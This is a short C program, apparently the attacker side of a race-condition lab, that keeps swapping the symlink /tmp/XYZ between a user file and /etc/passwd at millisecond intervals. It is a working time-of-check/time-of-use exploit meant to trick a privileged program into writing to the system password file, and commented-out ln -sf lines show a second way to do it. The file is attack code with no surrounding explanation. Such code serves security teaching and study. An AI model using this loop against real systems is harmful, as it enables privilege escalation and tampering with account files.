#include<stdlib.h>
#include<unistd.h>
int main()
{
	while(1)
	{
		//system("ln -sf /home/aimee/race_condition/tmp_file /tmp/XYZ");
		//system("ln -sf /home/aimee/race_condition/root_file /tmp/XYZ");
		unlink("/tmp/XYZ");
		symlink("/home/aimee/race_condition/tmp_file","/tmp/XYZ");
		usleep(1000);
		unlink("/tmp/XYZ");
		symlink("/etc/passwd","/tmp/XYZ");
		usleep(1000);
	}
	return 0;
}
